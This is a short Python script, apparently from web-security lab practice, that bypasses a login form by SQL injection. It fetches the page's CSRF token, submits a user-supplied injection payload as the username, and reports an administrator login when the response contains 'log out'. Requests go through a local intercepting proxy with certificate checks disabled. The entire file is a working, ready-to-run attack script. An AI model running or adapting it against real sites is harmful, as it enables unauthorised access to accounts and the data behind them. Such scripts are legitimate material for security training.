import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    # More specific way to find csrf token. You can modify the logic according to your webpage's structure.
    csrf = soup.find("input", {"name": "csrf_token"})  # Assuming the CSRF token is stored in the input with name 'csrf_token'
    if csrf:
        return csrf['value']
    else:
        raise ValueError("CSRF token not found!")

def exploit_sqli(s, url, payload):
    try:
        csrf = get_csrf_token(s, url)
    except ValueError as e:
        print(e)
        return False

    data = {
        "csrf_token": csrf,  # Make sure the name of the token matches
        "username": payload,
        "password": "randomtext"
    }
    
    # Fixed the typo here
    r = s.post(url, data=data, verify=False, proxies=proxies)
    res = r.text

    if "log out" in res:  # You can also use other indications for success
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        sqli_payload = sys.argv[2].strip()
    except IndexError:
        print(f'[-] Usage : {sys.argv[0]} <url> <sqli-payload>')
        print(f'[-] Example: {sys.argv[0]} www.hackThacker.com "1=1"')
        sys.exit(1)

    s = requests.session()

    if exploit_sqli(s, url, sqli_payload):
        print('[+] SQL injection successful! We have logged in as the administrator user.')
    else:
        print('[+] SQL injection unsuccessful!')
